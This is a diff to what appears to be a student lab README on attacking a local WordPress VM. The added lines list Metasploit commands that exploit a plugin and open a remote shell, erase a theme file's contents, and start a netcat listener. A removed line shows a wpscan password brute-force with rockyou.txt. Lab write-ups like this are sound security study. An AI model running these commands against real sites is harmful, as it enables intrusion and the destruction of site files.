@@ -61,8 +61,28 @@ Time spent: **X** hours spent in total
 
  - Commands used:
   <br /> wpscan --url http://wpdistillery.vm (Reconnasissance)
-  <br /> service postgresql start (
-  <br /> wpscan --url http://wpdistillery.vm -U ~/Desktop/wpusers.txt -P ~/Desktop/rockyou.txt (BruteForce Attack)
+  <br /> service postgresql start (for msf)
+  <br /> msfdb init (for msf)
+  <br /> msfconsole (msf)
+  <br /> db status (for msf)
+  <br /> search reflex (msf exploit)
+  <br /> use 0 (select module)
+  <br /> show options
+  <br /> set RHOST wpdistillery.vm (target)
+  <br /> set LHOST 192.168.33.101 (Kali VM)
+  <br /> run
+  <br /> shell
+  <br /> whoami
+  <br /> hostname
+  <br /> pwd 
+  <br /> ls
+  <br /> ../
+  <br /> pwd 
+  <br /> edit /var/www/public/wp-content/themes/twentyfifteen/archive.php
+  <br /> :%d
+  <br /> :wq
+  <br /> exit
+  <br /> nc -nvlp 80
   
   
 - [ ] Walkthrough:
